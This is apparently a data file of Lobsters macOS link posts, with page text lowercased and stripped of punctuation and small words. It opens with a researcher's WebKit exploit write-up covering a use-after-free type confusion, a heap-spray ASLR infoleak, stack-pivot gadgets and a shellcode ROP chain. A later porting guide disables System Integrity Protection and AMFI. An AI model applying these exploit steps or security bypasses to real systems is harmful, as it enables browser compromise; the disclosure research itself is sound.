infoleak bug leak address one executable module problem crop bug good infoleak could use purpose le masochistic vulnerability researcher would simply continue run fuzzer good infoleak bug would pop however instead finding better bug deliberately wanted limit bug found number iteration previous research consequence majority time spent working exploit turn bug infoleak stated primitive virtual method call freed object without aslr bypass thing would cause immediate crash replace freed object another object also vtable virtual method called called object time would mean calling valid virtual method valid object nothing interesting would happen however several scenario could lead interesting result virtual method could something dangerous call outofcontext example call destructor object member could get freed object continues live could turn original useafterfree issue another useafterfree issue possibly one give u better exploitation primitive since constructfromstring take single parameter type string could potentially cause type confusion input parameter virtual method expects parameter another type additionally virtual method take parameter constructfromstring would uninitialized could also lead exploitable behavior constructfromstring expected return pointer type svganimatedtype virtual method return type lead type confusion return value additionally virtual method return anything return value remains uninitialized vtables freed object object replaced different size calling vtable pointer freed object could result outofbounds read vtable object resulting calling virtual function third class exploit used option twist understand twist let examine svganimateelementbase class closely implement functionality svg animate element svg animate element used name suggests animate property another element example following element svg image animate attributename x dur cause x coordinate target element default parent element grow duration second use animate element animate various cs xml property controlled attributename property animate element interesting part property different type example might use animate element animate x coordinate element type svglengthvalue number unit might use animate fill attribute type color svganimateelementbase class type animated property tracked via member variable declared animatedpropertytype manimatedpropertytype animatedpropertytype enumeration possible type two member variable note std uniqueptr svganimatedtypeanimator manimator std uniqueptr svganimatedtype manimatedtype manimator useafterfree object manimatedtype object created possibly freed manimator svganimatedtypeanimator type manimator superclass subclass possible value animatedpropertytype svganimatedbooleananimator svganimatedcoloranimator etc svganimatedtype type manimatedtype variant contains type union possible value depending type important thing note normally subclass manimator type manimatedtype supposed match manimatedpropertytype example manimatedpropertytype animatedboolean type manimatedtype variant manimator instance svganimatedbooleananimator type match since manimator created based manimatedpropertytype manimatedtype created manimator oh wait exactly vulnerability occurs instead replacing freed animator something completely different causing type confusion svganimatedtype another class instead replace freed animator another animator subclass confuse svganimatedtype type another svganimatedtype type b one interesting thing bug would still bug even animator object get freed case bug turn type confusion trigger one would simply change manimatedpropertytype animate element different type javascript callback examine happens detail later led discussion office whether bug called useafterfree really different type bug useafterfree merely symptom note animator object always going get freed soon type animate element change lead interesting scenario exploit bug however choose call instead replacing freed object object another type could either replace object type make sure get replaced due memory allocation webkit work latter actually going happen time anyway object allocated memory page start getting replaced whole page becomes full additionally freeing object webkit corrupt would case allocator allows u still use normally even freed let examine type confusion work effect start animate element type manimatedpropertytype manimator manimatedtype match type resetanimatedtype get called retrieves animator pointer type resetanimatedtype call computecsspropertyvalue trigger javascript callback javascript callback change type animate element b changing attributename attribute cause svganimateelementbase resetanimatedpropertytype called manimatedtype manimator get deleted manimatedpropertytype get set b according new attributename manimatedtype manimator null manimatedpropertytype b return resetanimatedtype still local variable animator still point freed still functional animator type manimatedtype get created based freed animator manimatedtype type manimatedpropertytype b manimator null resetanimatedtype return animator local variable pointing freed animator type get lost never seen eventually resetanimatedtype get called since manimator still null manimatedpropertytype b creates manimator type b since manimatedtype nonnull instead creating anew initialize calling manimatedtype setvalueasstring manimatedpropertytype type b manimator type b manimatedtype type point value animated property get calculated happens svganimateelementbase calculateanimatedvalue line calling manimator calculateanimatedvalue manimatedtype mismatch manimator type b manimatedtype type however mismatch normally occur animator check type argument might debug asserts nothing release attempt write calculated animated value type b svganimatedtype type animated value computed read string set corresponding cs property happens actual type confusion happens step write svganimatedtype type actually type b rest interaction manimatedtype dangerous since simply getting setting value string operation safe regardless actual type note although animate element support animating xml property well cs property dance cs property code handling xml property different list cs property work found exploit type confusion infoleak initial idea exploit numeric type b string way type confusion write occurs string pointer written number would able read step problem well large number type combination value read step must valid cs property value context current animated property otherwise set correctly would able read example unable find string cs property list would accept value like similar promising approach due limitation step would replace numeric type another numeric type success floatrect b svglengthlistvalues vector svglengthvalue value like result vector pointer written floatrect type sometimes lead successfully disclosing heap address sometimes cs property type svglengthlistvalues use strokedasharray strokedasharray accepts positive value thus lower heap address want disclose look like negative floating point number ie highest bit set would able disclose address problem overcome spraying heap data lower heap address start becoming positive since need heap spraying anyway another approach take approach actually ended using svglengthlistvalues strokedasharray cs property b float strokemiterlimit cs property type confusion overwrites lowest bit svglengthvalue vector floating point number trigger type confusion need spray heap approximately data doable modern computer give u good probability change original heap address resulting address still going valid heap address especially yyyyyyyy high way disclose notquitearbitrary data arbitrary offset notquitearbitrary still limitation strokemiterlimit must positive disclose data heap interpretable float svglengthvalue type consists float followed enumeration describes unit used svglengthvalue read string step unit value valid appended number eg attempt set string like strokemiterlimit property fail thus next byte heap value want read must interpret invalid unit case unit appended reading svglengthvalue string note limitation often worked around nonaligned read moreorless usable read read whole point defeat aslr read pointer executable module often exploitation one would reading vtable pointer object heap however macos appears vtable pointer point separate memory region one containing executable code corresponding module instead reading vtable pointer need read function pointer instead ended using vttregion object heap spray vttregion object contains timer contains pointer function object case contains function pointer vttregion scrolltimerfired thus spray vttregion object take second quite notstateoftheart mac mini scan resulting memory function pointer give u aslr bypass one thing useful next phase address payload rop chain shellcode disclose following step find vttregion object heap spray setting vttregionheight property heap spray index spray array identify exactly million vttregion object read set vttregionid property vttregion object payload read vttregionid pointer ready triggering vulnerability second time time code exec time classic useafterfree exploitation scenario overwrite freed svganimatedtypeanimator object data control apple recently introduced gigacage separate large region memory lot attackercontrolled datatypes string array etc longer trivial however one thing still allocated main heap vector content finding vector whose content fully control overcome heap limitation ended using temporary vector used typedarrayset called copy value one javascript typed array another typed array vector temporary meaning deleted immediately use due memory allocation work webkit horrible like stability improvement task finding permanent controllable allocation left exercise reader time javascript event handler replace freed svganimatedtypeanimator vector whose first byte set point rop chain shellcode payload rop chain pretty straightforward one thing perhaps interesting stack pivot gadget case gadget used scenario virtual function freed object called call qword ptr rax point payload additionally rsi point freed object also control first thing want rop control stack unable find classic gadget accomplish mov rsp rax ret push rax pop rsp ret xchg rax rsp ret ended breaking stack pivot two gadget push rax mov rax rsi call rax offset first gadget push payload address stack common exactly original virtual function called apart push rax epilogue instruction second gadget pop whatever pop rsp ret first pop pop return address stack second pop finally get controlled value rsp gadget le common still appears way common stack pivot mentioned previously least binary final rop chain remember start reading offset address pop pop pop ret address push rax mov rax rsi call address pop ret address pop rbp pop rsp ret address pop rdi ret address pop rsi ret shellcode length address pop rdx ret protexec protread protwrite address pop rcx ret mapanon mapprivate address pop pop rbp ret address pop ret address mmap address push rax pop rdi ret address push rsp pop rbp ret address push rbp pop rax ret address add rax pop rbp ret address push rax pop rsi pop rbp ret address pop rdx ret shellcode length address memcpy address jmp rax shellcode rop chain call mmap shellcodelength protexec protread protwrite mapanon mapprivate calculates shellcode address copy address returned mmap shellcode called case shellcode sequence int instruction reaching safari crash debugger attached see shellcode successfully reached detect breakpoint process stopped thread queue comapplemainthread stop reason excbreakpoint frame target comapplewebkitwebcontent stopped realworld scenario shellcode could either secondstage exploit break safari sandbox alternately payload would turn issue universal x stealing crossdomain data exploit successfully tested mac o build version still using version might want update full exploit seen impact recent io mitigation interesting aspect exploit safari mac o could written oldschool way infoleak rop due lack control flow mitigation platform latest mobile hardware io published exploit already written apple introduced control flow mitigation using pointer authentication code pac plan write another version exploit time interesting discus exploit could modified affected recent mitigation exploit presented consists two part infoleak getting code execution pac would affect infoleak part way however would prevent jumping rop chain second part exploit could forge correct signature vtable pointer instead jumping rop code next stage exploit would likely need getting arbitrary readwrite primitive could potentially accomplished exploiting similar type confusion used infoleak different object combination notice type combination could result write especially attacker already infoleak investigate detail webkit process attacker arbitrary readwrite primitive could find way overwrite jit code failing data would cause fully partially controlled jit code emitted achieve code execution way exploit could still written admittedly would somewhat difficult write publishing advisory concluding blog post want draw attention patch issue listed blog post announced corresponding timeline issue reported apple june july september apple published security advisory io tvos safari fixed issue however although bug fixed time corresponding advisory initially mention issue described blog post added advisory one week later september security advisory macos mojave also published demonstrate discrepancy originally published advisory updated advisory compare archived version safari advisory september current version advisory note might need refresh page still old version browser cache original advisory likely include issue apple wanted wait issue also fixed macos adding however practice misleading customer interested apple security advisory would likely read first released impression would get product update fix far le vulnerability le severe vulnerability actually case furthermore practice publishing fix mobile desktop operating system time put desktop customer unnecessary risk attacker could reverseengineer patch mobile update develop exploit desktop product desktop customer would way update protect conclusion clearly improvement webkit dom tested domato public fuzzer still able find large number interesting bug nonoverlyprohibitive number iteration public tool able find many bug expected private one might even successful easy brush away bug something seen actual attacker use mean happening happen provided exploit demonstrates exploit include sandbox escape considered full chain however report security researcher indicate aspect browser security crack fuzzing note apple security sandbox escape relies attacking windowserver access removed sandbox safari macos mojave additionally dom exploit could used steal crossdomain data cooky even without sandbox escape fuzzing result might indicate webkit getting fuzzed perhaps sufficient computing power find fuzzable newly introduced bug make release version browser hoping research lead improved user security providing incentive apple allocate resource area browser security
257,Lobsters,mac,Apple macOS,LuLu: An open-source macOS firewall for outgoing connections,https://objective-see.com/products/lulu.html,lulu opensource macos firewall outgoing connection,fire ice making breaking macos firewall sharedsource github patreon download documentation xagent virustotal,note security tool direct proactive attempt specifically bypass lulu protection likely succeed design lulu currently implement limited selfdefense mechanism interested topic giving talk fire ice making breaking macos firewall virusbulletin lulu free sharedsource firewall macos goal simple block unknown outgoing connection approved user designed generically detect malware flagging unauthorized networking connection lulu also used block o component application transmitting information remote server like lulu lot free ad time trial missing feature nt track monitor spy pure evil shared source full source code lulu available github transparency allows anybody audit code understand exactly going protects lulu aim alert whenever unauthorized network connection attempted generically detect malware used block legitimate application may transmitting private data remote server simple one thing well lulu designed simply possible sure mean complex feature may available also mean easier use smaller attack surface enterprise friendly want know network event detected rule user added lulu provides simple mechanism subscribe event store data rule open easily digestible manner want support lulu via patreon page mahalo also important understand lulu limitation addressed software matures others design decision mostly goal keeping thing simple network monitoring design lulu monitor outgoing network connection apple built firewall great job blocking unauthorized incoming connection rule currently lulu support rule process level meaning process application either allowed connect network case firewall also mean legitimate allowed process abused malicious code perform network action allowed single user lulu installed single user future version likely allow installed multiple user system selfdefense legitimate attackerssecurity professional know security tool trivially bypassed specifically targeted even tool employ advanced selfdefense mechanism selfdefense mechanism often complex implement end almost always futile design lulu currently implement selfdefense mechanism example attacker could enumerate running process find lulu component responsible displaying alert terminate via sigkill installing lulu install lulu first download zip archive containing application depending browser may need manually unzip application doubleclicking zipped archive simply doubleclick lulu installerapp click install install tool installation lulu perform following install lulu component kernel extension launch daemon login item etc enumerate pre installed application rebuild kernel cache note last two step may take minute please patient also order complete install must reboot mac upon reboot lulu display welcome window various clickthru screen example allow one configure firewall version macos high sierra order load firewall kernel extension user assistance required click open system preference button load system preference application open general tab security privacy pane bottom click allow button allow objectivesee lulu kernel extension load detail userapproved kernel extension loading see apple documentation lulu installed running set automatically start time log unless configured run without statusbar icon appear status bar uninstalling lulu uninstall lulu simply rerun lulu installerapp click uninstall completer remove tool note also requires reboot complete using lulu alert lulu installed aim alert anytime new unauthorized process attempt create outgoing network connection lulul alert displayed russian malware xagent attempt connect command control server tasking alert designed fairly selfexplanatory let discus element process icon icon process displayed top right alert window process icon ie commandline utility background daemon default system icon displayed signing status virus total information virustotal cloud service given file hash return number antivirus engine flagged file malicious clicking virus total button lulu alert window reveal popover contains detection ratio process attempting create remote connection click detail link popup open virustotal report browser process hierarchy click process hierarchy button lulu alert view hierarchy process attempting create remote connection process information pid path lulu alert window also contains process id pid full path process attempting create remote connection attempted connection information remote endpoint information specifically ip address port protocol process attempting connect also displayed lulu alert window block allow clicking block button prevents process establishing outgoing connection creates rule process disallowing establishing network connection clicking allow button allows process establishing outgoing connection creates rule process allowing establishing network connection using lulu rule process either allowed access network blocked based lulu rule course lulu nt rule connection alert displayed rule window display rule well allows one manually create delete rule window access either launching lulu application applicationsluluapp clicking rule lulu status bar menu five tab rule window rule first tab show lulu rule word combination default apple baseline user rule default rule second tab show lulu default system rule rule deleted via ui applemacos process must allowed communicate network order preserve system functionality apple rule allow apple program option selected either welcome configuration screen lulu preference process signed apple proper automatically allowed connect network also allow rule created show apple rule baseline rule allow installed application option selected either welcome configuration screen lulu preference application component pre installed automatically allowed connect network also allow rule created show baseline rule user rule fifth final tab show rule user created either manually via add rule button clicking block allow lulu connection alert window manually add rule click add rule button bottom rule window bring add rule dialogue box dialog box enter path target application process click browse open file chooser window select block allow finally click add add rule new rule added user rule note rule already exists process application add rule fail word existing rule deleted first delete rule simply click x button right hand side rule rule window x button disabled mean rule deleted via ui ie defaultsystem rule also one right control click selected rule click delete rule lulu rule stored libraryobjectiveseelulurulesplist one root privilege design rule directly read andor modified cat libraryobjectiveseelulurulesplist xml version encoding doctype plist public appledtd plist plist version dict key applicationsapp storeapp key dict key action key integer integer key type key integer integer key user key integer integer dict rule also imported exported via ui import rule import new set rule simply click import button bottom left rule window file selection panel choose file contains rule import note importing rule global fully replace existing rule export rule export save existing rule simply click export button bottom left rule window save panel choose location like save rule using lulu preference lulu configured via preference pane open pane either main lulu application applicationsluluapp via lulu status bar menu click preference preference pane three tab rule rule tab allows one configure lulu automatically generate rule allow apple program option selected process signed apple proper automatically allowed connect network also allow rule created show rule window apple rule allow installed application option selected application component pre installed automatically allowed connect network also allow rule created show rule window baseline rule visuals visual tab allows one configure lulu run passive mode alert new connection allowed iconless mode icon status bar update update tab allows one check new version well disable automatic check new version lulu faq lulu called lulu hawaiian word lulu mean protection shield peace tool aim instill peace providing protective shield seemed fitting name lulu along objectivesee tool coded aloha lovely island maui perfect name need lulu turned builtin macos firewall yes apple builtin firewall block incoming connection lulu designed detect block outgoing connection generated malware malware attempt connect command control server tasking exfiltrates data lulu conflict paid macos firewall security product although point testing limited lulu appears play nice tool found bug issue lulu fix
259,Lobsters,mac,Apple macOS,macOS Dynamic Desktop,https://nshipster.com/macos-dynamic-desktop/,macos dynamic desktop,wwdc session introducing heif hevc digging deeper coregraphics shining light solar file signature binary property list calculating solar position complicated something seems work extending understanding xmp creating dynamic desktop writing image destination automatically generating dynamic desktop photo exif metadata shooting time lapse iphone skyflow generating landscape gi data terragen national map website downloading premade dynamic desktop hour wallpaper u twitter,dark mode one popular addition macos especially among u developer type tend towards lightondark color theme text editor appreciate new visual consistency across system couple year back similar fanfare night shift helped reduce eye strain hacking late night early morning triangulate two macos feature get dynamic desktop also new mojave go system preference desktop screen saver option select dynamic desktop picture change throughout day based location result subtle delightful background track passage time make desktop feel alive tune natural world nothing else make lovely visual effect switching dark mode work exactly question week nshipster article answer involves deep dive image format little bit reverseengineering even spherical trigonometry first step understanding dynamic desktop work get hold dynamic image running macos mojave open finder select go go enter librarydesktop picture directory find file named mojaveheic doubleclick open preview preview sidebar show list thumbnail numbered showing different view desert scene select tool show inspector get general information looking unfortunately preview give u least time writing click next panel info inspector learn whole lot subject color model rgb depth pixel height pixel width profile name display heic file extension corresponds image container encoded using heif highefficiency image file format based hevc highefficiency video compression also known video information check wwdc session introducing heif hevc want learn need roll sleeve get hand dirty lowlevel apis digging deeper coregraphics let start investigation creating new xcode playground simplicity hardcode url mojaveheic file system import foundation import coregraphics macos mojave required let url url fileurlwithpath librarydesktop picturesmojaveheic next create cgimagesource copy metadata enumerate tag let source cgimagesourcecreatewithurl url cfurl nil let metadata cgimagesourcecopymetadataatindex source nil let tag cgimagemetadatacopytags metadata cgimagemetadatatag tag tag guard let name cgimagemetadatatagcopyname tag let value cgimagemetadatatagcopyvalue tag else continue print name value run code get two result hasxmp value true solar decidedly le understandable value shining light solar u would look wall text quietly close lid macbook pro surely noticed text look awful lot like let test hypothesis code name solar let data data value print string data data encoding ascii u u bplist followed bunch garbled nonsense golly file signature binary property list let see propertylistserialization make sense swift plaintext name solar let data data value let propertylist try propertylistserialization propertylist data option format nil print propertylist ap l si z z talking two toplevel key ap key corresponds dictionary containing integer l key si key corresponds array dictionary integer floatingpoint value nested dictionary key easiest understand incrementing index image sequence hard guess z without additional information turn represent altitude azimuth z sun corresponding picture calculating solar position time writing u northern hemisphere settling season autumn shorter colder day whereas u southern hemisphere gearing hotter longer day changing season reminds u duration solar day depends planet planet orbit around sun good news astronomer tell perfect accuracy sun sky location time bad news necessary calculation complicated say least honestly really understand pretty much porting whatever code manage find online trial error able arrive something seems work pr welcome import foundation import corelocation apple park cupertino ca let location cllocation latitude longitude let time date let position solarposition location time let formatteddate dateformatterlocalizedstring time datestyle medium timestyle short print solar position formatteddate print positionazimuth az positionelevation el solar position oct az el noon october sun shine apple park south halfway horizon directly overhead track position sun entire day get sinusoidal shape reminiscent apple watch solar face extending understanding xmp alright enough astronomy moment let ground something much banal de facto xml metadata standard remember hasxmp metadata key yeah xmp extensible metadata platform standard format tagging file metadata xmp look like brace swift xml let xmpdata cgimagemetadatacreatexmpdata metadata nil let xmp string data xmpdata data encoding print xmp x xmpmeta xmlns x adobe n meta x xmptk xmp core rdf rdf xmlns rdf http rdf description rdf xmlns appledesktop http appledesktop solar metadata appledesktop solar rdf description rdf rdf x xmpmeta yuck good thing checked need honor appledesktop namespace make dynamic desktop image work correctly speaking let get started creating dynamic desktop let create data model represent dynamic desktop struct dynamicdesktop let image image struct image let cgimage cgimage let metadata metadata struct metadata codable let index int let altitude double let azimuth double private enum codingkeys string codingkey case index case altitude case azimuth z dynamic desktop comprises ordered sequence image image data stored cgimage object metadata discussed adopt codable metadata declaration order compiler automatically synthesize conformance take advantage come time generate binary property list writing image destination first create cgimagedestination specified output url file type heic source count equal number image included guard let imagedestination cgimagedestinationcreatewithurl outputurl cfurl avfiletypeheic cfstring dynamicdesktopimagescount nil else fatalerror error creating image destination next enumerate image dynamic desktop object using enumerated method also get current index loop set image metadata first image index image dynamicdesktopimagesenumerated index let imagemetadata cgimagemetadatacreatemutable guard let tag cgimagemetadatatagcreate http cfstring appledesktop cfstring solar cfstring string try cfstring cgimagemetadatasettagwithpath imagemetadata nil xmp solar cfstring tag else fatalerror error creating image metadata cgimagedestinationaddimageandmetadata imagedestination imagecgimage imagemetadata nil else cgimagedestinationaddimage imagedestination imagecgimage nil aside unrefined nature core graphic apis code pretty straightforward part requires explanation call cgimagemetadatatagcreate mismatch image container metadata structured represented code implement encodable dynamicdesktop extension dynamicdesktop encodable private enum codingkeys string codingkey case ap si private enum nestedcodingkeys string codingkey case l func encode encoder encoder throw var keyedcontainer encodercontainer keyedby codingkeysself var nestedkeyedcontainer keyedcontainernestedcontainer keyedby nestedcodingkeysself forkey ap fixme sure l key indicate try nestedkeyedcontainerencode forkey l try nestedkeyedcontainerencode selfimagescount forkey var unkeyedcontainer keyedcontainernestedunkeyedcontainer forkey si image selfimages try unkeyedcontainerencode imagemetadata place implement aforementioned method like extension dynamicdesktop func throw string let encoder propertylistencoder encoderoutputformat binary let binarypropertylistdata try encoderencode self return forin loop exhausted image metadata written call cgimagedestinationfinalize finalize image source write image disk guard cgimagedestinationfinalize imagedestination else fatalerror error finalizing image everything worked expected proud owner brand new dynamic desktop nice love dynamic desktop feature mojave excited see proliferation saw wallpaper hit mainstream window inclined idea go automatically generating dynamic desktop photo mindblowing think something transcendent movement celestial body reduced system equation two input time place example information hardcoded could ostensibly extract information image automatically default camera phone capture exif metadata time photo snapped metadata include time photo taken gps coordinate device time reading time location information directly image metadata automatically determine solar position simplify process generating dynamic desktop series photo shooting time lapse iphone want put new iphone x good use accurately want use old iphone something productive procrastinate selling mount phone window plug charger set camera timelapse mode hit record button extracting key frame resulting video make bespoke dynamic desktop might also want check skyflow similar apps easily allow take still photo predefined interval generating landscape gi data stand away phone entire day sad anything remarkable look also sad could always create reality sound sadder using app like terragen render photorealistic landscape finetuned control earth sun sky make even easier downloading elevation map u geological survey national map website using template rendering project downloading premade dynamic desktop actual work bothered spend time making pretty picture always pay someone else personally fan hour wallpaper app recommendation u twitter
260,Lobsters,mac,Apple macOS,An Ode to Sad Mac (Screen Saver),https://stefan.arentz.ca/2018/09/21/an-ode-to-sad-mac/,ode sad mac screen saver,ode sad mac download sadmacsaverzip,ode sad mac sep official build sad mac screen saver wrote last year properly codesigned install run without permission issue macos newer download sadmacsaverzip work open source see project feel free leave bug report open feature request
261,Lobsters,mac,Apple macOS,GPG Suite 2018.4 is released and is a trial,https://gpgtools.org/releases/gpgsuite/2018.4/release-notes.html,gpg suite released trial,gpg suite introducing gpg mail macos mojave high sierra,gpg suite september introducing gpg mail macos mojave high sierra macos mojave around corner could nt stoked telling gpg mail ready best user experience advised install release upgrading macos mojave otherwise manually enable gpg mail upgrade following u long time might come much surprise almost ten year developing gpg suite decided start charging fee continued use gpg mail installation update able test gpg mail another day trial period still able decrypt incoming message order verify encrypt new message gpg mail support plan required hope understand decision keep supporting u
262,Lobsters,mac,Apple macOS,Retrieving the full path of a process on MacOS (and exploring procfs),https://ops.tips/blog/macos-pid-absolute-path-and-procfs-exploration/,retrieving full path process macos exploring procfs,proc filesystem linux kernel doc sysctl procfs hood great linux programming interface linux unix system programming handbook libproc library macos private post primarily meet internal requirement rather need thirdparty developer golang binary suit linux macos cgo cirocostapidpath closing thought linux programming interface linux unix system programming handbook cirowrc,hey another day trying make sure given process running using specific binary built figure p would show nonabsolute path could know absolute path hugo binary assuming could multiple hugo binary path p pid tty time cmd hugo serve applicationsitermappcontent bash applicationsitermappcontent bash using linux though thought easy head proc search pid process check exe link done linux machine see hugo still show absolute path like macos p aux grep hugo ubuntu sl hugo serve given proc filesystem provide u information process check exe link provide link actual executable stat file usrlocalbinhugo size block io block symbolic link device inode link access uid ubuntu gid ubuntu access modify change birth post go gather information macos procfs linux tl dr proc linux dope macos compile little code us procpidpath libproc install pidpath proc filesystem linux linux land thing called procfs virtual filesystem sense real regular file disk map filesystem representation allows user userspace perform introspection current running process others well kernel doc proc file system act interface internal data structure kernel used obtain information system change certain kernel parameter runtime sysctl way interaction set pretty nifty process receives given path proc like proc pid subdirectory path various file subdirectory present allow deeper introspection specific pid display file directory present root proc find list pid access well systemwide information setting tweak l lah proc total drxrxrx root root sep drwxrxrx root root sep drxrxrx root root sep drxrxrx root root sep drxrxrx root root sep r r r root root sep scheddebug r r r root root sep schedstat drxrxrx root root sep scsi lrwxrwxrwx root root sep self getting specific pid path able gather information specific given process l lah total drxrxrx root root sep drxrxrx root root sep lrwxrwxrwx root root sep cwd r root root sep environ lrwxrwxrwx root root sep exe libsystemdsystemdudevd drx root root sep fd lrwxrwxrwx root root sep root rwr r root root sep sched procfs helpful sure process blocked something expect like write nfs mount point malformed due bad set server responding something simple process sleeping want sleep day background sleep check state process cat sleep state interruptible sleep command run sleep command process id pid used check stack trace kernel perspective led process sleep state cat procfs hood interesting virtual implementation procfs able generate representation filesystem fly whenever issue io call like read linux answer back asked list file descriptor opened given process list environment variable set process startup time instance tracing execution cat proc pid meminfo find path read syscall take stack trace cat proc pid meminfo meminfoprocshow procregread vfsread vfsread sysread stack trace cat filetxt mount point vfsread vfsread sysread different regular read shown second stack trace real file disk accessed meminfoprocshow returning content related user asked virtual memory stuff way interested knowing related subject great reference type knowledge linux programming interface linux unix system programming handbook macos libproc library macos differently linux feel like know much thing work macos searching bit accomplish gather information process libproc showed mentioned libproch header file contains private interface obtain process information interface subject change future release one thing note interface private guaranteed compatibility future release elucidated apple staff member post apple developer forum regarding gathering process information apple put lot effort providing apis getting sort information apis exist either inherited o predecessor os added primarily meet internal requirement rather need thirdparty developer thus find lot place apis incomplete incorrect poorly documented binary compatible anyway still make use specifically make use procpidpath method take pid pid process want know buffer path written buffer size int procpidpath int pid pid process know void buffer buffer fill ab path buffersize size buffer said go ahead create go binary handle linux macos specifying two different compilation target golang binary suit linux macos given libproc thing linux start creating pidpathlinuxgo file meant compiled linux another file pidpathdarwingo aimed macos machine linux one rather simple follows proc pid exe symlink build linux package main import o strconv func getexepathfrompid pid int path string err error path err osreadlink proc strconvitoa pid exe return macos version though need little bit given access libproc via c leverage cgo build darwin package main include libproch include stdlibh include errnoh import c import fmt unsafe bufsize reference constant implementation procpidpath us hood make sure overflow happen see http const bufsize cprocpidpathinfomaxsize func getexepathfrompid pid int path string err error allocate c heap string char terminated size bufsize make sure free memory get allocated c see defer buf ccstring string make byte bufsize defer cfree unsafepointer buf call c function procpidpath included header file libproch ret err cprocpidpath cint pid unsafepointer buf bufsize ret err fmterrorf failed retrieve pid path v err return convert c string back go string path cgostring buf return done consume getexepathfrompid application see place check cirocostapidpath closing thought interesting check different thing macos land although use macbook pro personal computer mac work really paid attention little detail also proc valuable definitely worth knowing functionality make sure check linux programming interface linux unix system programming handbook question suggestion improve blog post please let know cirowrc love chat good one
263,Lobsters,mac,Apple macOS,Marzipan: Porting iOS Apps to the Mac,https://pspdfkit.com/blog/2018/porting-ios-apps-to-mac-marzipan-iosmac-uikit-appkit/,marzipan porting io apps mac,slide speakerdeck great video youtube channel marzipan even drag drop work size class scale factor history timeline osmeta window bridge io chameleon project bloomberg sneak peek wwdc iosmac architecture voicememosapp voicememod uikitsystemapp uikithostappxpc great post architecture internals iosmac overview current hack great coverage steven troughtonsmith marzipanify supporting patreon disable security virtual machine always work update michael thomas porting pdf viewer mac pdf viewer pspdfkit step minimum deployment target io step remove framework step convert automate step allow swift calling convention changed become better mac citizen apple home app spelunking window toolbar controller class complete gist header never easy weak linking header bonus inspecting view hierarchy talk vlas voloshin conclusion steipete marzipandemic,macos mojave apple adding support run uikit apps macos without requirement rewriting ui appkit yet something officially supported thirdparty developer let explore expect try today article based talk presented try swift new york called hacking marzipan find slide speakerdeck sure also check great video youtube channel warning exploring iosmac platform requires hack weaken security mac use separate machine explore new technology distribute iosmac apps yet underlying framework still private likely subject change marzipan marzipan apple new io application layer mac run apps written uikit related io framework way make sense mac already run io apps mac year simulator marzipan way evolution simulator however use simulator architecture much deeply integrated includes support adding button window chrome menu bar focus ring much even drag drop work interesting fact marzipan size class scale factor everything rendered little smaller fit better mac history timeline first time uikit running platform originally designed facebook internal closed source project called osmeta basically complete rewrite uikit entire io platform microsoft project islandwood aka window bridge io github find attempt like chameleon project however uikit large beast realistically apple port awesomeness flaw mark gurman leaked news marzipan late bloomberg hardly anyone believed apple would really go path even engineer surprised craig federighi chose present sneak peek wwdc macos late official sdk thirdparty developer iosmac architecture running iosmac app spawn whole list process appkit shell display uikit app uikitsystemapp mac version frontboard applicationsvoicememosapp systemiossupportsystemlibraryprivateframeworks voicememosframeworksupportvoicememod systemlibrarycoreservicesuikitsystemapp systemlibraryprivateframeworksuikithostappservicesframework versionsaxpcservicesuikithostappxpc disguised like learn adam demasi wrote great post architecture internals iosmac overview current hack apple testing new platform stage macos mojave delivers phase new appleprovided apps running iosmac phase developer get access platform however various way work around apple current restriction marzipan michał kałużny hack one first deserves special mention piggyback apple iosmac apps injects code app convert app much like virus entering cell causing thing cell made approach scale kałużny get point creativity early marzipanplatter best choice converting io apps macos successfully ported pdf viewer mojave beta mac however approach mixed uikit appkit flawed got great coverage steven troughtonsmith offer complete conversion tool marzipanify currently best way port app basically performs following action add marzipan glue patch infoplist modifies mach header add private iosmac entitlement use marzipanify article shoutout steven amazing tool find useful consider supporting patreon disable security apple locked thing quite bit make iosmac apps box least without hack hack discussed need disable apple system integrity protection something generally mentioned good idea use separate machine experiment hack used also need disable sandboxing apple control apps get private iosmac entitlement without magic amfigetoutofmyway boot argument experiment terminated get chance run amfi short applemobilefileintegrity virtual machine always work iosmac platform requires gpu acceleration simply exit available update seems apple actively working deficiency mojave beta apps including home pdf viewer mac run inside vm news still fails load shoutout michael thomas pinging change porting pdf viewer mac pdf viewer fairly complex io application written c c objectivec swift based pspdfkit million line code development since make pretty compelling test case step minimum deployment target io need ensure minimum deployment target project dependent framework set io linker emits lcbuildversion flag v earlier lcbuildversionminmacos io set required iosmac load correct dependency marzipanify try work around cause lot trouble might end binary start one moment using one central xcconfig file really pay step remove framework remove code us deprecated feature iosmac new platform include class already deprecated likely issue uiwebview still ubiquitous despite faster wkwebview available many year framework available except make sense port mac like one safariservicesframework sfsafariviewcontroller make sense mac use openurl coretelephonyframework cttelephonynetworkinfo especially socialframework slcomposeviewcontroller messageuiframework mfmailcomposeviewcontroller openglesframework rewritten metal addressbookframework new framework exists guaranteed symbol available example using uimarkuptextprintformatter part uikit since io iosmac startup quickly see symbol missing following incomplete list symbol available uiimpactfeedbackgenerator mac way generate haptic feedback nop instead uiprintinfo probably related uiwebview missing uiviewcontroller setneedsupdateofhomeindicatorautohidden mojave uikit branch might cut iphone x branch merged uidocumentbrowser document browser concept make sense mac phcachingimagemanager photosframework problem chose hybrid approach resolve issue via patchadding missing symbol small glue file called uikitiosmacfixesm step convert automate since using marzipanify requires additional step recommendation automate conversion process try adding automation script xcode build setting running small script seemed good enough lldb ready type run step allow swift one took long time understand system complains swift support library built iosmac manually copied systemlibraryprivateframeworksswift however almost nothing worked anymore thing constantly crashed weird overrelease issue using swift swift support library systemlibraryprivateframeworksswift older version point recently calling convention changed basic calling objectivec bridged class still worked thing broke soon complex call like calling bundlemainbundleurl edit systemiossupportdyldmacoswhitelisttxt append applicationspdfviewermacappcontentsmacos replace path path binary dependency load appkit process iosmac refuse load unless run via lldb however good reason appkit blocked modifiesclashes many uikit internals app likely crash startup render font ever get crash uilabel nswidgettype know case photosframework caused appkit loaded fix found remove photo reference application use select image image annotation however minor feature app work great without pdf viewer look mac file picker concept something would ship macos ok hack work great including directory watcher new file added become better mac citizen looking toolbar quite done good mac citizen mean use native toolbar like apple home app see done usually spelunking ida hopper great disassembling peeking inside apple apps opening home app hopper searching toolbar responsible class easy find apple apps use window toolbar controller class manage window controller surprise uiwindowtoolbarcontroller class look interesting would get one bit trickier found uikitcore eventually complete gist header ok really surprising linker like declare class provide implementation obviously part io uikit one took course every problem solution many year back apple added weak linking class entire framework weak linked could extract framework exactly want get something going quickly simply weak link per class instructs compiler weak link specified class link let run never easy runtime seem happy symbol told linker thing might available yet told runtime let fix weak linking header weakimport attribute tell runtime method might available case resolved nil look action bonus inspecting view hierarchy manage trigger xcode view debugger talk vlas voloshin mentioned reveal work change mojave later beta 